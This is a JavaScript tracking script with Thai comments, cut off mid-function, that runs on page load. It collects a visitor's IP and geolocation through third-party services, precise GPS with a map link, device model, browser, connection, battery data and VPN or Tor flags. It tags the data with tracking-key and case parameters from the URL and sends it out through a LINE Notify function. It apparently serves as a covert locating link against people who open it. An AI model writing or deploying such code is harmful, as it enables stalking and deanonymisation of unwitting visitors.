// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  // สร้าง ID จากเวลาในรูปแบบ base36 + random ค่า + ค่าสุ่มเพิ่มเติมเพื่อความปลอดภัย
  const timestamp = Date.now().toString(36);
  const randomStr = Math.random().toString(36).substring(2, 10);
  const extraRandom = crypto && crypto.getRandomValues ? 
    Array.from(crypto.getRandomValues(new Uint8Array(2)), b => b.toString(16)).join('') : 
    Math.random().toString(36).slice(-4);
    
  return timestamp + randomStr + extraRandom;
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่ทราบ";
  
  // โครงสร้างข้อมูลผลลัพธ์
  const deviceInfo = {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: "ไม่ทราบ",
    deviceModel: "ไม่ทราบ",
    platform: "ไม่ทราบ",
    osVersion: "ไม่ทราบ",
    browserEngine: "ไม่ทราบ"
  };
  
  // ตรวจสอบประเภทอุปกรณ์ด้วย Regex ที่ละเอียดมากขึ้น
  const tabletRegex = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i;
  const mobileRegex = /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i;
  
  if (tabletRegex.test(userAgent)) {
    deviceInfo.deviceType = "แท็บเล็ต";
  } else if (mobileRegex.test(userAgent)) {
    deviceInfo.deviceType = "มือถือ";
  } else {
    deviceInfo.deviceType = "คอมพิวเตอร์";
  }
  
  // ตรวจสอบระบบปฏิบัติการและเวอร์ชัน
  if (/Windows NT 10.0/.test(userAgent)) {
    deviceInfo.platform = "Windows 10/11";
  } else if (/Windows NT 6.3/.test(userAgent)) {
    deviceInfo.platform = "Windows 8.1";
  } else if (/Windows NT 6.2/.test(userAgent)) {
    deviceInfo.platform = "Windows 8";
  } else if (/Windows NT 6.1/.test(userAgent)) {
    deviceInfo.platform = "Windows 7";
  } else if (/Mac OS X/.test(userAgent)) {
    const osxVersionMatch = userAgent.match(/Mac OS X (\d+[._]\d+[._]?\d*)/i);
    if (osxVersionMatch) {
      // แปลงรูปแบบเวอร์ชันให้เป็นที่อ่านง่าย 10_15_7 -> 10.15.7
      const osVersion = osxVersionMatch[1].replace(/_/g, '.');
      deviceInfo.platform = `macOS ${osVersion}`;
      
      // ตรวจสอบชื่อ macOS ตามเวอร์ชัน
      const majorVersion = parseInt(osVersion.split('.')[0], 10);
      const minorVersion = parseInt(osVersion.split('.')[1], 10);
      
      if (majorVersion >= 13) {
        deviceInfo.platform = `macOS Ventura หรือใหม่กว่า (${osVersion})`;
      } else if (majorVersion === 12) {
        deviceInfo.platform = `macOS Monterey (${osVersion})`;
      } else if (majorVersion === 11) {
        deviceInfo.platform = `macOS Big Sur (${osVersion})`;
      } else if (majorVersion === 10 && minorVersion === 15) {
        deviceInfo.platform = `macOS Catalina (${osVersion})`;
      } else if (majorVersion === 10 && minorVersion === 14) {
        deviceInfo.platform = `macOS Mojave (${osVersion})`;
      }
    } else {
      deviceInfo.platform = "macOS";
    }
  } else if (/Linux/.test(userAgent) && !/Android/.test(userAgent)) {
    deviceInfo.platform = "Linux";
    // ตรวจสอบ Linux distro เพิ่มเติม
    if (/Ubuntu/.test(userAgent)) {
      deviceInfo.platform = "Ubuntu Linux";
    } else if (/Fedora/.test(userAgent)) {
      deviceInfo.platform = "Fedora Linux";
    } else if (/Debian/.test(userAgent)) {
      deviceInfo.platform = "Debian Linux";
    }
  } else if (/Android/.test(userAgent)) {
    const androidVersionMatch = userAgent.match(/Android (\d+(\.\d+)+)/);
    if (androidVersionMatch) {
      deviceInfo.platform = `Android ${androidVersionMatch[1]}`;
      deviceInfo.osVersion = androidVersionMatch[1];
    } else {
      deviceInfo.platform = "Android";
    }
  } else if (/iPhone|iPad|iPod/.test(userAgent)) {
    const iosVersionMatch = userAgent.match(/OS (\d+[._]\d+[._]?\d*) like Mac OS X/);
    if (iosVersionMatch) {
      const iosVersion = iosVersionMatch[1].replace(/_/g, '.');
      deviceInfo.platform = `iOS ${iosVersion}`;
      deviceInfo.osVersion = iosVersion;
    } else {
      deviceInfo.platform = "iOS";
    }
  } else if (/CrOS/.test(userAgent)) {
    deviceInfo.platform = "Chrome OS";
  }
  
  // ตรวจสอบรุ่นอุปกรณ์แบบละเอียด
  // สำหรับ iPhone
  if (/iPhone/.test(userAgent)) {
    const models = {
      // iPhone X, XR, XS series
      "iPhone1[0-3],[1-8]": "iPhone X/XR/XS Series",
      // iPhone 11 series
      "iPhone1[2-4],[1-8]": "iPhone 11 Series",
      // iPhone 12 series
      "iPhone1[3-4],[1-8]": "iPhone 12 Series",
      // iPhone 13 series
      "iPhone1[4-5],[1-8]": "iPhone 13 Series",
      // iPhone 14 series
      "iPhone1[5-6],[1-8]": "iPhone 14 Series",
      // iPhone 15 series
      "iPhone1[6-7],[1-8]": "iPhone 15 Series",
    };
    
    // ระบุ iPhone รุ่นตามขนาดหน้าจอและเวอร์ชัน iOS
    if (window.screen) {
      const { width, height } = window.screen;
      const maxDimension = Math.max(width, height);
      
      if (maxDimension >= 900) { // iPhone Plus/Pro Max models
        deviceInfo.deviceModel = "iPhone (รุ่นใหญ่ Plus/Pro Max)";
      } else if (maxDimension >= 800) { // iPhone standard/Pro models
        deviceInfo.deviceModel = "iPhone (รุ่นมาตรฐาน/Pro)";
      } else if (maxDimension >= 700) { // iPhone mini/SE models
        deviceInfo.deviceModel = "iPhone (รุ่นเล็ก mini/SE)";
      } else {
        deviceInfo.deviceModel = "iPhone";
      }
    } else {
      deviceInfo.deviceModel = "iPhone";
    }
    
    // ดูเพิ่มเติมจาก User Agent
    for (const [modelRegex, modelName] of Object.entries(models)) {
      if (new RegExp(modelRegex).test(userAgent)) {
        deviceInfo.deviceModel = modelName;
        break;
      }
    }
  }
  // สำหรับ iPad
  else if (/iPad/.test(userAgent)) {
    if (/iPad Pro/.test(userAgent)) {
      deviceInfo.deviceModel = "iPad Pro";
    } else if (/iPad Air/.test(userAgent)) {
      deviceInfo.deviceModel = "iPad Air";
    } else if (/iPad mini/.test(userAgent)) {
      deviceInfo.deviceModel = "iPad mini";
    } else {
      deviceInfo.deviceModel = "iPad";
    }
  }
  // สำหรับ Android
  else if (/Android/.test(userAgent)) {
    // ดึงชื่อรุ่นจาก User Agent
    const androidDeviceMatch = userAgent.match(/Android [0-9\.]+; ([^;)]+)/i);
    
    if (androidDeviceMatch) {
      let model = androidDeviceMatch[1].trim();
      
      // ตัดคำว่า "Build" ออก ถ้ามี
      if (model.includes("Build")) {
        model = model.substring(0, model.indexOf("Build")).trim();
      }
      
      // ระบุแบรนด์และโมเดล
      if (/samsung/i.test(model)) {
        if (/SM-G9/i.test(model) || /SM-N9/i.test(model) || /SM-S/i.test(model) || /Galaxy S/i.test(model) || /Galaxy Note/i.test(model)) {
          deviceInfo.deviceModel = `Samsung Galaxy (High-end: ${model})`;
        } else if (/SM-A/i.test(model) || /Galaxy A/i.test(model)) {
          deviceInfo.deviceModel = `Samsung Galaxy (Mid-range: ${model})`;
        } else if (/SM-J/i.test(model) || /Galaxy J/i.test(model)) {
          deviceInfo.deviceModel = `Samsung Galaxy (Budget: ${model})`;
        } else {
          deviceInfo.deviceModel = `Samsung ${model}`;
        }
      } else if (/huawei/i.test(model) || /HUAWEI/i.test(model)) {
        deviceInfo.deviceModel = `Huawei ${model}`;
      } else if (/xiaomi/i.test(model) || /Redmi/i.test(model)) {
        deviceInfo.deviceModel = `Xiaomi ${model}`;
      } else if (/oppo/i.test(model) || /OPPO/i.test(model)) {
        deviceInfo.deviceModel = `OPPO ${model}`;
      } else if (/vivo/i.test(model) || /vivo/i.test(model)) {
        deviceInfo.deviceModel = `Vivo ${model}`;
      } else if (/oneplus/i.test(model) || /OnePlus/i.test(model)) {
        deviceInfo.deviceModel = `OnePlus ${model}`;
      } else if (/pixel/i.test(model) || /Pixel/i.test(model)) {
        deviceInfo.deviceModel = `Google Pixel ${model}`;
      } else if (/nokia/i.test(model) || /Nokia/i.test(model)) {
        deviceInfo.deviceModel = `Nokia ${model}`;
      } else {
        deviceInfo.deviceModel = model;
      }
    } else {
      deviceInfo.deviceModel = "Android Device";
    }
  }
  
  // ตรวจสอบ browser engine
  if (/Trident|MSIE/.test(userAgent)) {
    deviceInfo.browserEngine = "Trident (IE)";
  } else if (/Edg/.test(userAgent)) {
    deviceInfo.browserEngine = "Blink (Chromium Edge)";
  } else if (/Chrome/.test(userAgent)) {
    deviceInfo.browserEngine = "Blink (Chromium)";
  } else if (/Safari/.test(userAgent)) {
    deviceInfo.browserEngine = "WebKit (Safari)";
  } else if (/Firefox|FxiOS/.test(userAgent)) {
    deviceInfo.browserEngine = "Gecko (Firefox)";
  }
  
  // ตรวจสอบข้อมูลอุปกรณ์เพิ่มเติมด้วย Client Hints API (ถ้าเบราว์เซอร์รองรับ)
  try {
    if (navigator.userAgentData) {
      // ดึงข้อมูลพื้นฐาน
      deviceInfo.isMobile = navigator.userAgentData.mobile;
      
      // อัปเดตประเภทอุปกรณ์จาก User-Agent Client Hints
      if (typeof deviceInfo.isMobile === 'boolean') {
        if (deviceInfo.isMobile === true && deviceInfo.deviceType !== "แท็บเล็ต") {
          deviceInfo.deviceType = "มือถือ";
        } else if (deviceInfo.isMobile === false) {
          deviceInfo.deviceType = "คอมพิวเตอร์";
        }
      }
      
      // ร้องขอข้อมูล high-entropy values ถ้าเบราว์เซอร์รองรับ
      if (navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues([
          "platform", "platformVersion", "architecture", 
          "model", "uaFullVersion", "fullVersionList"
        ]).then(ua => {
          // อัปเดตข้อมูลอุปกรณ์ด้วยข้อมูลที่แม่นยำกว่า
          if (ua.platform) deviceInfo.platformFromClientHints = ua.platform;
          if (ua.platformVersion) deviceInfo.platformVersionFromClientHints = ua.platformVersion;
          if (ua.model) deviceInfo.modelFromClientHints = ua.model;
          if (ua.architecture) deviceInfo.architecture = ua.architecture;
          
          // อัปเดตข้อมูลแพลตฟอร์มถ้ามีข้อมูลที่ละเอียดกว่า
          if (ua.platform && ua.platformVersion) {
            let platformInfo = `${ua.platform} ${ua.platformVersion}`;
            if (deviceInfo.platform === "ไม่ทราบ" || ua.platform !== "Android") {
              deviceInfo.platform = platformInfo;
            }
          }
          
          // อัปเดตข้อมูลรุ่นอุปกรณ์ถ้ามีข้อมูลที่ละเอียดกว่า
          if (ua.model && ua.model !== "") {
            deviceInfo.deviceModel = ua.model;
          }
          
          // ข้อมูลเบราว์เซอร์ละเอียด
          if (ua.fullVersionList && ua.fullVersionList.length > 0) {
            deviceInfo.detailedBrowserInfo = ua.fullVersionList;
          }
        }).catch(e => {
          console.log("ไม่สามารถดึงข้อมูล High-entropy User-Agent Client Hints:", e);
        });
      }
    }
  } catch (e) {
    console.log("ไม่สามารถใช้งาน User-Agent Client Hints API:", e);
  }
  
  return deviceInfo;
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  
  let connectionInfo = {
    type: "ไม่สามารถระบุได้",
    effectiveType: "ไม่สามารถระบุได้",
    downlink: "ไม่สามารถระบุได้",
    rtt: "ไม่สามารถระบุได้",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้"
  };
  
  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;
    
    // ตรวจสอบประเภทการเชื่อมต่อละเอียดมากขึ้น
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
      
      // ประเมินความเร็ว WiFi จาก downlink
      if (connection.downlink) {
        if (connection.downlink >= 10) {
          connectionInfo.networkQuality = "ความเร็วสูง";
        } else if (connection.downlink >= 2) {
          connectionInfo.networkQuality = "ความเร็วปานกลาง";
        } else {
          connectionInfo.networkQuality = "ความเร็วต่ำ";
        }
      }
    }
    else if (connection.type === 'cellular') {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "เครือข่ายมือถือ";
      
      // ระบุประเภทเครือข่ายมือถือจาก effectiveType
      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
        connectionInfo.networkType = "2G";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.networkType = "3G";
      } else if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "4G/LTE";
      }
      
      // ตรวจสอบจาก Navigator
      if (/5g/i.test(navigator.userAgent) || connection.type === '5g') {
        connectionInfo.networkType = "5G";
      }
    }
    else if (['ethernet', 'wired'].includes(connection.type)) {
      connectionInfo.networkType = "สายแลน (Ethernet)";
    }
    else if (connection.type === 'bluetooth') {
      connectionInfo.networkType = "Bluetooth";
    }
    else if (connection.type === 'wimax') {
      connectionInfo.networkType = "WiMAX";
    }
    else if (connection.type === 'none') {
      connectionInfo.networkType = "ไม่มีการเชื่อมต่อ";
    }
    else if (connection.type === 'unknown') {
      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
      if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "การเชื่อมต่อความเร็วสูง (น่าจะเป็น WiFi)";
        connectionInfo.isWifi = true;
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.networkType = "การเชื่อมต่อมือถือ";
        connectionInfo.isMobile = true;
      } else {
        connectionInfo.networkType = "ไม่สามารถระบุประเภทได้";
      }
    }
    
    // ตรวจสอบโหมด Data Saver
    if (connection.saveData) {
      connectionInfo.saveDataMode = "เปิดใช้งานโหมดประหยัดข้อมูล";
    }
  } else {
    // ถ้าไม่มี Network Information API ให้พยายามตรวจสอบจาก userAgent
    const userAgent = navigator.userAgent.toLowerCase();
    
    if (/mobile|android|iphone|ipad|ipod|windows phone|iemobile|opera mobi/i.test(userAgent)) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "น่าจะเป็นเครือข่ายมือถือ (ประมาณการ)";
    } else {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "น่าจะเป็น WiFi/Ethernet (ประมาณการ)";
    }
  }
  
  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      
      // คำนวณเวลาที่เหลือ (กรณีกำลังชาร์จ หรือกำลังใช้งาน)
      let remainingTime = "ไม่สามารถคำนวณได้";
      if (battery.charging && battery.chargingTime !== Infinity) {
        // แปลงวินาทีเป็นชั่วโมงและนาที
        const hours = Math.floor(battery.chargingTime / 3600);
        const minutes = Math.floor((battery.chargingTime % 3600) / 60);
        remainingTime = `อีกประมาณ ${hours}h ${minutes}m จะเต็ม`;
      } else if (!battery.charging && battery.dischargingTime !== Infinity) {
        const hours = Math.floor(battery.dischargingTime / 3600);
        const minutes = Math.floor((battery.dischargingTime % 3600) / 60);
        remainingTime = `อีกประมาณ ${hours}h ${minutes}m จะหมด`;
      }
      
      // สร้างข้อความสถานะ
      let chargingStatus;
      if (battery.charging) {
        chargingStatus = battery.level >= 0.99 ? "ชาร์จเต็มแล้ว" : "กำลังชาร์จ";
      } else {
        chargingStatus = "ไม่ได้ชาร์จ";
      }
      
      // ประเมินสุขภาพแบตเตอรี่ (อย่างคร่าวๆ)
      let batteryHealth = "ปกติ";
      // บันทึกข้อมูลแบตเตอรี่เพิ่มเติม (เพื่อตรวจสอบแนวโน้มการใช้งาน - ถ้าผู้ใช้เข้าใช้งานหลายครั้ง)
      try {
        // เก็บข้อมูลการชาร์จแบตในเบราว์เซอร์
        const storedBatteryData = localStorage.getItem('batteryData');
        let batteryDataHistory = storedBatteryData ? JSON.parse(storedBatteryData) : [];
        
        // เก็บข้อมูลปัจจุบัน
        const currentData = {
          timestamp: Date.now(),
          level: battery.level,
          charging: battery.charging
        };
        batteryDataHistory.push(currentData);
        
        // เก็บเฉพาะ 5 ค่าล่าสุด
        if (batteryDataHistory.length > 5) {
          batteryDataHistory = batteryDataHistory.slice(-5);
        }
        
        localStorage.setItem('batteryData', JSON.stringify(batteryDataHistory));
      } catch (e) {
        // ถ้าไม่สามารถเขียน localStorage ได้ ไม่ต้องทำอะไร
      }
      
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: chargingStatus,
        remainingTime: remainingTime,
        health: batteryHealth
      };
    }
    
    // ถ้าไม่รองรับ Battery API
    return {
      level: "ไม่ทราบ",
      charging: "ไม่สามารถระบุได้"
    };
  } catch (error) {
    console.error("ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่:", error);
    return {
      level: "ไม่สามารถเข้าถึงได้",
      charging: "ไม่สามารถระบุได้",
      error: error.message
    };
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";

  if (userAgent.indexOf("Firefox") > -1) {
    browserName = "Firefox";
    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("SamsungBrowser") > -1) {
    browserName = "Samsung Browser";
    browserVersion = userAgent.match(/SamsungBrowser\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
    browserName = "Opera";
    browserVersion = userAgent.indexOf("Opera") > -1 ?
                     userAgent.match(/Opera\/([\d.]+)/)[1] :
                     userAgent.match(/OPR\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Edge") > -1) {
    browserName = "Microsoft Edge";
    browserVersion = userAgent.match(/Edge\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Edg") > -1) {
    browserName = "Microsoft Edge (Chromium)";
    browserVersion = userAgent.match(/Edg\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Chrome") > -1) {
    browserName = "Chrome";
    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Safari") > -1) {
    browserName = "Safari";
    browserVersion = userAgent.match(/Version\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
    browserName = "Internet Explorer";
    browserVersion = userAgent.match(/(?:MSIE |rv:)([\d.]+)/)[1];
  }

  return `${browserName} ${browserVersion}`;
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ลองใช้ ipinfo.io ก่อน (มีข้อมูลละเอียดกว่า)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();
    
    // ตรวจสอบว่าเป็น IP จาก VPN, Datacenter, Proxy หรือไม่
    let ipType = "residential"; // ค่าเริ่มต้นคือ IP บ้านทั่วไป
    let ipNotes = "";
    
    // ตรวจสอบจากชื่อองค์กร (org) - อาจเป็น datacenter หรือ VPN
    if (ipDetails.org) {
      const org = ipDetails.org.toLowerCase();
      if (org.includes('amazon') || org.includes('aws') || 
          org.includes('digital ocean') || org.includes('linode') ||
          org.includes('microsoft') || org.includes('azure') ||
          org.includes('google') || org.includes('cloud') ||
          org.includes('hosting') || org.includes('data center') ||
          org.includes('datacenter') || org.includes('server')) {
        ipType = "datacenter";
        ipNotes = "น่าจะเป็น IP จาก datacenter/cloud";
      } else if (org.includes('vpn') || org.includes('nord') || 
                org.includes('express vpn') || org.includes('private') || 
                org.includes('surfshark') || org.includes('proton')) {
        ipType = "vpn";
        ipNotes = "น่าจะใช้ VPN";
      } else if (org.includes('tor') || org.includes('exit') || 
                org.includes('relay')) {
        ipType = "tor";
        ipNotes = "น่าจะใช้ Tor network";
      } else if (org.includes('proxy') || org.includes('cdn') || 
                org.includes('cloudflare')) {
        ipType = "proxy";
        ipNotes = "น่าจะผ่าน Proxy";
      }
    }
    
    // ตรวจสอบจากชื่อโฮสต์ - อาจเป็น dynamic IP จาก ISP
    if (ipDetails.hostname) {
      const hostname = ipDetails.hostname.toLowerCase();
      if (hostname.includes('dynamic') || hostname.includes('ppp') ||
          hostname.includes('pool') || hostname.includes('dhcp')) {
        if (ipType === "residential") {
          ipNotes = "IP ไดนามิก (เปลี่ยนแปลงได้)";
        }
      } else if (hostname.includes('static')) {
        if (ipType === "residential") {
          ipNotes = "IP คงที่";
        }
      }
    }
    
    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล",
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ",
      countryName: getCountryNameFromCode(ipDetails.country) || ipDetails.country || "ไม่ทราบ",
      loc: ipDetails.loc || "ไม่มีข้อมูล",
      org: ipDetails.org || "ไม่ทราบ",
      postal: ipDetails.postal || "ไม่มีข้อมูล",
      timezone: ipDetails.timezone || "ไม่ทราบ",
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ",
      ipType: ipType, // ประเภทของ IP (residential, datacenter, vpn, proxy, tor)
      ipNotes: ipNotes // หมายเหตุเพิ่มเติม
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    
    // ลองใช้ ipapi.co หรือ ip-api.com เป็น fallback
    try {
      const fallbackResponse = await fetch('https://ipapi.co/json/');
      if (!fallbackResponse.ok) throw new Error("Fallback API failed");
      
      const fallbackData = await fallbackResponse.json();
      
      return {
        ip: fallbackData.ip || "ไม่สามารถระบุได้",
        hostname: "ไม่มีข้อมูล", // ipapi.co ไม่มีข้อมูลนี้
        city: fallbackData.city || "ไม่ทราบ",
        region: fallbackData.region || fallbackData.region_name || "ไม่ทราบ",
        country: fallbackData.country_code || fallbackData.country || "ไม่ทราบ",
        countryName: fallbackData.country_name || getCountryNameFromCode(fallbackData.country_code) || "ไม่ทราบ",
        loc: fallbackData.latitude && fallbackData.longitude ? 
             `${fallbackData.latitude},${fallbackData.longitude}` : "ไม่มีข้อมูล",
        org: fallbackData.org || "ไม่ทราบ",
        postal: fallbackData.postal || fallbackData.zip || "ไม่มีข้อมูล",
        timezone: fallbackData.timezone || "ไม่ทราบ",
        asn: fallbackData.asn || "ไม่ทราบ",
        isp: fallbackData.org || "ไม่ทราบ",
        ipType: "ไม่สามารถระบุได้", // ไม่มีข้อมูลนี้
        ipNotes: "ข้อมูลจาก fallback API"
      };
    } catch (fallbackError) {
      console.error("ไม่สามารถใช้ fallback API:", fallbackError);
      
      // ถ้าใช้ fallback ไม่ได้ จะใช้บริการ API อย่างง่ายสุดเพื่อให้ได้ IP
      try {
        const basicResponse = await fetch('https://api.ipify.org?format=json');
        const basicData = await basicResponse.json();
        return {
          ip: basicData.ip || "ไม่สามารถระบุได้",
          country: "ไม่ทราบ",
          countryName: "ไม่ทราบ",
          city: "ไม่ทราบ",
          ipType: "ไม่สามารถระบุได้",
          ipNotes: "มีเพียงข้อมูล IP พื้นฐานเท่านั้น"
        };
      } catch (basicError) {
        return { ip: "ไม่สามารถระบุได้" };
      }
    }
  }
}

// ฟังก์ชันเพิ่มเติม: แปลงรหัสประเทศเป็นชื่อประเทศ
function getCountryNameFromCode(countryCode) {
  if (!countryCode) return null;
  
  const countries = {
    "TH": "ไทย",
    "US": "สหรัฐอเมริกา",
    "UK": "สหราชอาณาจักร",
    "GB": "สหราชอาณาจักร",
    "JP": "ญี่ปุ่น",
    "CN": "จีน",
    "SG": "สิงคโปร์",
    "MY": "มาเลเซีย",
    "KR": "เกาหลีใต้",
    "TW": "ไต้หวัน",
    "HK": "ฮ่องกง",
    "LA": "ลาว",
    "VN": "เวียดนาม",
    "KH": "กัมพูชา",
    "MM": "พม่า",
    "PH": "ฟิลิปปินส์",
    "ID": "อินโดนีเซีย",
    "AU": "ออสเตรเลีย",
    "NZ": "นิวซีแลนด์",
    "DE": "เยอรมนี",
    "FR": "ฝรั่งเศส",
    "IT": "อิตาลี",
    "ES": "สเปน",
    "PT": "โปรตุเกส",
    "NL": "เนเธอร์แลนด์",
    "BE": "เบลเยียม",
    "CH": "สวิตเซอร์แลนด์",
    "AT": "ออสเตรีย",
    "SE": "สวีเดน",
    "NO": "นอร์เวย์",
    "DK": "เดนมาร์ก",
    "FI": "ฟินแลนด์",
    "RU": "รัสเซีย",
    "CA": "แคนาดา",
    "MX": "เม็กซิโก",
    "BR": "บราซิล",
    "AR": "อาร์เจนตินา",
    "ZA": "แอฟริกาใต้",
    "EG": "อียิปต์",
    "IN": "อินเดีย",
    "PK": "ปากีสถาน"
  };
  
  return countries[countryCode] || null;
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
